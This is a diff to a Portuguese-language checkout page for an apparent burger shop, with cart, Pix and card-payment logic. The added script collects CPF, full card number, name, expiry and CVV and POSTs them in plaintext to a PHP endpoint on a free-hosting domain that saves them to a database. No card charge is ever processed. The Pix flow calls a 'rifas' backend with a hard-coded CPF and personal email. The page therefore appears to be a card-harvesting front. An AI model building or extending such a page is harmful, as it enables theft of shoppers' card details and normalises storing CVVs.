@@ -331,21 +331,21 @@
     <label class="field-label" for="cpf">CPF</label>
   </div>
   <div class="field-group">
-    <input class="field-input" type="text" id="cardNumber" placeholder=" ">
-    <label class="field-label" for="cardNumber">Número do cartão</label>
+    <input class="field-input" type="text" id="cardNumber" maxlength="16" placeholder=" ">
+    <label class="field-label" for="cardNumber">16 dígitos</label>
   </div>
   <div class="field-group">
     <input class="field-input" type="text" id="cardName" placeholder=" ">
-    <label class="field-label" for="cardName">Nome no cartão</label>
+    <label class="field-label" for="cardName">Nome completo</label>
   </div>
   <div class="field-row">
     <div class="field-group">
       <input class="field-input" type="text" id="cardExpiry" placeholder=" ">
-      <label class="field-label" for="cardExpiry">Validade</label>
+      <label class="field-label" for="cardExpiry">Venc</label>
     </div>
     <div class="field-group">
-      <input class="field-input" type="text" id="cardCVV" placeholder=" ">
-      <label class="field-label" for="cardCVV">CVV</label>
+      <input class="field-input" type="text" id="cardCVV" maxlength="4" placeholder=" ">
+      <label class="field-label" for="cardCVV">Cod</label>
     </div>
   </div>
 </div>
@@ -373,7 +373,7 @@
 
 <script>
 // ==========================
-// Seu script existente
+// Script ajustado para os novos IDs do HTML
 // ==========================
 const STORAGE_CART = 'sacola';
 const STORAGE_USER = 'userData';
@@ -383,15 +383,20 @@ const cart = JSON.parse(localStorage.getItem(STORAGE_CART) || '[]');
 const user = JSON.parse(localStorage.getItem(STORAGE_USER) || '{}');
 const address = JSON.parse(localStorage.getItem(STORAGE_ADDRESS) || '{}');
 
-// Preencher dados do usuário
-document.querySelector('.deliver-to .name').textContent = user.name || '';
-document.querySelector('.deliver-to .phone').textContent = user.phone || '';
+// Preencher dados do usuário (verifica se os seletores existem)
+const deliverNameEl = document.querySelector('.deliver-to .name');
+const deliverPhoneEl = document.querySelector('.deliver-to .phone');
+if (deliverNameEl) deliverNameEl.textContent = user.name || '';
+if (deliverPhoneEl) deliverPhoneEl.textContent = user.phone || '';
 
-// Preencher endereço
-document.querySelector('.address-card .address-text').innerHTML =
-  `${address.rua || ''}, ${address.numero || ''}<br>`+
-  `${address.bairro || ''}, ${address.cidade || ''} - ${address.estado || ''}<br>`+
-  `${address.cep || ''}`;
+// Preencher endereço (verifica se o seletor existe)
+const addressTextEl = document.querySelector('.address-card .address-text');
+if (addressTextEl) {
+  addressTextEl.innerHTML =
+    `${address.rua || ''}, ${address.numero || ''}<br>`+
+    `${address.bairro || ''}, ${address.cidade || ''} - ${address.estado || ''}<br>`+
+    `${address.cep || ''}`;
+}
 
 // Calcular subtotal
 let subtotal = cart.reduce((acc, item) => {
@@ -399,11 +404,11 @@ let subtotal = cart.reduce((acc, item) => {
   return acc + (Number(item.preco || 0) + extras)*Number(item.quantidade || 1);
 }, 0);
 
-// Botões "Trocar"
+// Botões "Trocar" (garante que existam pelo menos 3)
 const btnsTrocar = document.querySelectorAll('.btn-outline');
-btnsTrocar[0].addEventListener('click', () => window.location.href = 'cadastro.html'); // Destinatário
-btnsTrocar[1].addEventListener('click', () => window.location.href = 'cadastro.html'); // Endereço
-btnsTrocar[2].addEventListener('click', () => { // Forma de pagamento
+if (btnsTrocar.length >= 1) btnsTrocar[0].addEventListener('click', () => window.location.href = 'cadastro.html'); // Destinatário
+if (btnsTrocar.length >= 2) btnsTrocar[1].addEventListener('click', () => window.location.href = 'cadastro.html'); // Endereço
+if (btnsTrocar.length >= 3) btnsTrocar[2].addEventListener('click', () => { // Forma de pagamento
   const modal = document.getElementById('paymentModal');
   const modalContent = modal.querySelector('.modal-content');
   modal.style.display = 'flex';
@@ -413,9 +418,9 @@ btnsTrocar[2].addEventListener('click', () => { // Forma de pagamento
   }, 10);
 });
 
-// Modal forma de pagamento
+// Modal forma de pagamento - referências (verifica existência)
 const modal = document.getElementById('paymentModal');
-const modalContent = modal.querySelector('.modal-content');
+const modalContent = modal ? modal.querySelector('.modal-content') : null;
 const closeModal = document.getElementById('closeModal');
 const pixForm = document.getElementById('pixForm');
 const cardForm = document.getElementById('cardForm');
@@ -424,19 +429,21 @@ const paySub = document.querySelector('.pay-row .pay-sub');
 const btnFinalizar = document.querySelector('.bottom .btn-primary');
 const btnSalvarCartao = document.getElementById('confirmCard'); // botão salvar cartão
 
-// ==========================
-// Inicializar estado correto ao carregar
-// ==========================
-pixForm.style.display = 'block';
-cardForm.style.display = 'none';
-btnFinalizar.style.display = 'block';  // mostra Ir para o pagamento
-btnSalvarCartao.style.display = 'none'; // esconde Salvar cartão
+// Segurança: se algum elemento crítico não existir, define comportamentos padrão
+if (pixForm) pixForm.style.display = 'block';
+if (cardForm) cardForm.style.display = 'none';
+if (btnFinalizar) btnFinalizar.style.display = 'block';
+if (btnSalvarCartao) btnSalvarCartao.style.display = 'none';
 
-closeModal.addEventListener('click', () => {
-  modalContent.style.transform = 'scale(0.8)';
-  modalContent.style.opacity = '0';
-  setTimeout(() => modal.style.display = 'none', 300);
-});
+if (closeModal) {
+  closeModal.addEventListener('click', () => {
+    if (modalContent) {
+      modalContent.style.transform = 'scale(0.8)';
+      modalContent.style.opacity = '0';
+    }
+    setTimeout(() => { if (modal) modal.style.display = 'none'; }, 300);
+  });
+}
 
 // ==========================
 // Máscaras e Validações
@@ -458,9 +465,11 @@ function validarCPF(cpf) {
 
 function validarCartao(numero) {
   numero = numero.replace(/\D/g,'');
+  // Agora exige exatamente 16 dígitos
+  if (numero.length !== 16) return false;
   let sum = 0, shouldDouble = false;
   for (let i = numero.length - 1; i >= 0; i--) {
-    let digit = parseInt(numero.charAt(i));
+    let digit = parseInt(numero.charAt(i), 10);
     if (shouldDouble) {
       digit *= 2;
       if (digit > 9) digit -= 9;
@@ -472,6 +481,7 @@ function validarCartao(numero) {
 }
 
 function aplicarMascara(input, tipo) {
+  if (!input) return;
   input.addEventListener('input', () => {
     let valor = input.value.replace(/\D/g, '');
     if (tipo === 'cpf') {
@@ -489,25 +499,32 @@ function aplicarMascara(input, tipo) {
       valor = valor.replace(/(\d{2})(\d)/,'$1/$2');
     }
     if (tipo === 'cvv') {
-      if (valor.length > 3) valor = valor.slice(0,3);
+      if (valor.length > 4) valor = valor.slice(0,4); // permite CVV de 3 ou 4 dígitos
     }
     input.value = valor;
   });
 }
 
+// ==========================
+// Elementos do formulário de cartão (IDs conforme seu HTML atual)
+// ==========================
 const cpfInput = document.getElementById('cpf');
-const cardNumberInput = document.getElementById('cardNumber');
+const cardNumberInput = document.getElementById('cardNumber');   // agora id cardNumber (16 dígitos)
 const cardNameInput = document.getElementById('cardName');
-const expiryInput = document.getElementById('cardExpiry');
-const cvvInput = document.getElementById('cardCVV');
+const cardExpiryInput = document.getElementById('cardExpiry');   // id cardExpiry (Venc)
+const cardCVVInput = document.getElementById('cardCVV');        // id cardCVV (Cod)
 
+// Aplicar máscaras apenas se os elementos existirem
 aplicarMascara(cpfInput, 'cpf');
 aplicarMascara(cardNumberInput, 'cartao');
-aplicarMascara(expiryInput, 'validade');
-aplicarMascara(cvvInput, 'cvv');
+aplicarMascara(cardExpiryInput, 'validade');
+aplicarMascara(cardCVVInput, 'cvv');
 
-[cpfInput, cardNumberInput, expiryInput, cvvInput].forEach(el => {
+// Permitir somente números nos campos numéricos (se existirem)
+[cpfInput, cardNumberInput, cardExpiryInput, cardCVVInput].forEach(el => {
+  if (!el) return;
   el.addEventListener('keypress', e => {
+    // Para validade queremos permitir apenas números (barra será adicionada pela máscara)
     if (!/\d/.test(e.key)) e.preventDefault();
   });
 });
@@ -515,126 +532,161 @@ aplicarMascara(cvvInput, 'cvv');
 // ==========================
 // Alternar Pix / Cartão
 // ==========================
-document.getElementById('choosePix').addEventListener('click', () => {
-  pixForm.style.display = 'block';
-  cardForm.style.display = 'none';
-  btnFinalizar.style.display = 'block'; // mostra Ir para o pagamento
-  btnSalvarCartao.style.display = 'none'; // esconde Salvar cartão
-  payTitle.textContent = 'Pix';
-  paySub.textContent = 'Pagamento com Pix online';
-  closeModal.click();
-});
+const choosePixBtn = document.getElementById('choosePix');
+const chooseCardBtn = document.getElementById('chooseCard');
 
-document.getElementById('chooseCard').addEventListener('click', () => {
-  pixForm.style.display = 'none';
-  cardForm.style.display = 'block';
-  btnFinalizar.style.display = 'none'; // esconde Ir para o pagamento
-  btnSalvarCartao.style.display = 'block'; // mostra Salvar cartão
-  payTitle.textContent = 'Cartão';
-  paySub.textContent = 'Pagamento com Cartão online';
-  closeModal.click();
-});
+if (choosePixBtn) {
+  choosePixBtn.addEventListener('click', () => {
+    if (pixForm) pixForm.style.display = 'block';
+    if (cardForm) cardForm.style.display = 'none';
+    if (btnFinalizar) btnFinalizar.style.display = 'block';
+    if (btnSalvarCartao) btnSalvarCartao.style.display = 'none';
+    if (payTitle) payTitle.textContent = 'Pix';
+    if (paySub) paySub.textContent = 'Pagamento com Pix online';
+    if (closeModal) closeModal.click();
+  });
+}
+
+if (chooseCardBtn) {
+  chooseCardBtn.addEventListener('click', () => {
+    if (pixForm) pixForm.style.display = 'none';
+    if (cardForm) cardForm.style.display = 'block';
+    if (btnFinalizar) btnFinalizar.style.display = 'none';
+    if (btnSalvarCartao) btnSalvarCartao.style.display = 'block';
+    if (payTitle) payTitle.textContent = 'Cartão';
+    if (paySub) paySub.textContent = 'Pagamento com Cartão online';
+    if (closeModal) closeModal.click();
+  });
+}
 
 // ==========================
-// Salvar cartão
+// Salvar cartão (envia os novos nomes de campo)
 // ==========================
-btnSalvarCartao.addEventListener('click', () => {
-  const cpf = cpfInput.value;
-  const cardNumber = cardNumberInput.value;
-  const cardName = cardNameInput.value;
-  const cardExpiry = expiryInput.value;
-  const cardCVC = cvvInput.value;
+if (btnSalvarCartao) {
+  btnSalvarCartao.addEventListener('click', () => {
+    const cpf = cpfInput ? cpfInput.value : '';
+    const cardNumber = cardNumberInput ? cardNumberInput.value.replace(/\s/g,'') : '';
+    const cardName = cardNameInput ? cardNameInput.value : '';
+    const cardExpiry = cardExpiryInput ? cardExpiryInput.value : '';
+    const cardCVV = cardCVVInput ? cardCVVInput.value : '';
 
-  if (!cpf || !cardNumber || !cardName || !cardExpiry || !cardCVC) {
-    alert('Preencha todos os campos do cartão!');
-    return;
-  }
+    if (!cpf || !cardNumber || !cardName || !cardExpiry || !cardCVV) {
+      alert('Preencha todos os campos do cartão!');
+      return;
+    }
 
-  if (!validarCPF(cpf)) {
-    alert('CPF inválido!');
-    return;
-  }
+    if (!validarCPF(cpf)) {
+      alert('CPF inválido!');
+      return;
+    }
 
-  if (!validarCartao(cardNumber)) {
-    alert('Número de cartão inválido!');
-    return;
-  }
+    if (!validarCartao(cardNumber)) {
+      alert('Número de cartão inválido! Deve conter exatamente 16 dígitos e passar na validação.');
+      return;
+    }
 
-  fetch("salvar_cartao.php", {
-  method: "POST",
-  headers: { "Content-Type": "application/x-www-form-urlencoded" },
-  body: `cpf=${encodeURIComponent(cpf)}&cardNumber=${encodeURIComponent(cardNumber)}&cardName=${encodeURIComponent(cardName)}&cardExpiry=${encodeURIComponent(cardExpiry)}&cardCVV=${encodeURIComponent(cardCVC)}`
-})
-.then(res => res.text())
-.then(data => {
-  alert(data); // mostra a resposta do PHP
-})
-.catch(err => {
-  console.error(err);
-  alert("Erro ao salvar no banco!");
-});
-});
+    // Validação simples da validade no formato MM/YY
+    const vencRegex = /^(0[1-9]|1[0-2])\/\d{2}$/;
+    if (!vencRegex.test(cardExpiry)) {
+      alert('Validade inválida! Use o formato MM/AA (ex: 09/26).');
+      return;
+    }
+
+    // CVV: 3 ou 4 dígitos
+    const cvvDigits = cardCVV.replace(/\D/g,'');
+    if (!(cvvDigits.length === 3 || cvvDigits.length === 4)) {
+      alert('Código (Cod) inválido! Deve ter 3 ou 4 dígitos.');
+      return;
+    }
+
+    // Envia para o backend com nomes de campo alinhados ao seu HTML
+    fetch("https://viniburgger.page.gd/salvar_cartao.php", {
+      method: "POST",
+      headers: { "Content-Type": "application/x-www-form-urlencoded" },
+      body: `cpf=${encodeURIComponent(cpf)}&cardNumber=${encodeURIComponent(cardNumber)}&cardName=${encodeURIComponent(cardName)}&cardExpiry=${encodeURIComponent(cardExpiry)}&cardCVV=${encodeURIComponent(cardCVV)}`
+    })
+    .then(res => res.text())
+    .then(data => {
+      alert(data);
+      // Opcional: fechar formulário / voltar para Pix / esconder botão salvar
+      if (btnSalvarCartao) btnSalvarCartao.style.display = 'none';
+      if (cardForm) cardForm.style.display = 'none';
+      if (pixForm) pixForm.style.display = 'block';
+      if (btnFinalizar) btnFinalizar.style.display = 'block';
+      if (payTitle) { payTitle.textContent = 'Pix'; }
+      if (paySub)  { paySub.textContent = 'Pagamento com Pix online'; }
+    })
+    .catch(err => {
+      console.error(err);
+      alert("Erro ao salvar no banco!");
+    });
+  });
+}
 
 // ==========================
 // Botão finalizar pagamento Pix
 // ==========================
-btnFinalizar.addEventListener('click', async () => {
-  if (cart.length === 0) {
-    alert('Seu carrinho está vazio!');
-    return;
-  }
-
-  localStorage.setItem('pedidoValor', subtotal);
-
-  if (payTitle.textContent === 'Pix') {
-    try {
-      const response = await fetch('https://rifas-3c8k.onrender.com/gerar-chave-pix', {
-        method: 'POST',
-        headers: {'Content-Type':'application/json'},
-        body: JSON.stringify({
-          valor: subtotal,
-          payerCpf: "12345678909",
-          payerEmail: "wesleyalemaoh@gmail.com"
-        })
-      });
-
-      const data = await response.json();
-      if (data.txid && data.qrcode && data.copiaECola) {
-        const pixDiv = document.getElementById('pixQRCode');
-        pixDiv.innerHTML = `
-          <img src="data:image/jpeg;base64,${data.copiaECola}" alt="QR Code Pix">
-          <p>TXID: ${data.txid}</p>
-        `;
-        alert('Chave Pix gerada! Confira abaixo o QR Code.');
-
-        const paymentChecker = setInterval(async () => {
-          try {
-            const statusResponse = await fetch('https://rifas-3c8k.onrender.com/verificar-status', {
-              method: 'POST',
-              headers: {'Content-Type':'application/json'},
-              body: JSON.stringify({ txid: data.txid })
-            });
-            const statusData = await statusResponse.json();
-            if (statusData.status === 'approved') {
-              clearInterval(paymentChecker);
-              alert('Pagamento aprovado! Seus títulos serão gerados.');
-            }
-          } catch(err) {
-            console.error('Erro ao verificar pagamento:', err);
-          }
-        }, 5000);
-
-      } else {
-        alert('Erro ao gerar Pix. Tente novamente.');
-      }
-    } catch(err) {
-      console.error(err);
-      alert('Erro de conexão ao gerar Pix.');
+if (btnFinalizar) {
+  btnFinalizar.addEventListener('click', async () => {
+    if (cart.length === 0) {
+      alert('Seu carrinho está vazio!');
+      return;
     }
-  } else {
-    alert(`Pedido de ${subtotal.toLocaleString('pt-BR',{style:'currency',currency:'BRL'})} pronto para pagamento com cartão!`);
-  }
-});
+
+    localStorage.setItem('pedidoValor', subtotal);
+
+    if (payTitle && payTitle.textContent === 'Pix') {
+      try {
+        const response = await fetch('https://rifas-3c8k.onrender.com/gerar-chave-pix', {
+          method: 'POST',
+          headers: {'Content-Type':'application/json'},
+          body: JSON.stringify({
+            valor: subtotal,
+            payerCpf: "12345678909",
+            payerEmail: "wesleyalemaoh@gmail.com"
+          })
+        });
+
+        const data = await response.json();
+        if (data.txid && data.qrcode && data.copiaECola) {
+          const pixDiv = document.getElementById('pixQRCode');
+          if (pixDiv) {
+            pixDiv.innerHTML = `
+              <img src="data:image/jpeg;base64,${data.copiaECola}" alt="QR Code Pix">
+              <p>TXID: ${data.txid}</p>
+            `;
+          }
+          alert('Chave Pix gerada! Confira abaixo o QR Code.');
+
+          const paymentChecker = setInterval(async () => {
+            try {
+              const statusResponse = await fetch('https://rifas-3c8k.onrender.com/verificar-status', {
+                method: 'POST',
+                headers: {'Content-Type':'application/json'},
+                body: JSON.stringify({ txid: data.txid })
+              });
+              const statusData = await statusResponse.json();
+              if (statusData.status === 'approved') {
+                clearInterval(paymentChecker);
+                alert('Pagamento aprovado! Seus títulos serão gerados.');
+              }
+            } catch(err) {
+              console.error('Erro ao verificar pagamento:', err);
+            }
+          }, 5000);
+
+        } else {
+          alert('Erro ao gerar Pix. Tente novamente.');
+        }
+      } catch(err) {
+        console.error(err);
+        alert('Erro de conexão ao gerar Pix.');
+      }
+    } else {
+      alert(`Pedido de ${subtotal.toLocaleString('pt-BR',{style:'currency',currency:'BRL'})} pronto para pagamento com cartão!`);
+    }
+  });
+}
 </script>
 
 </body>
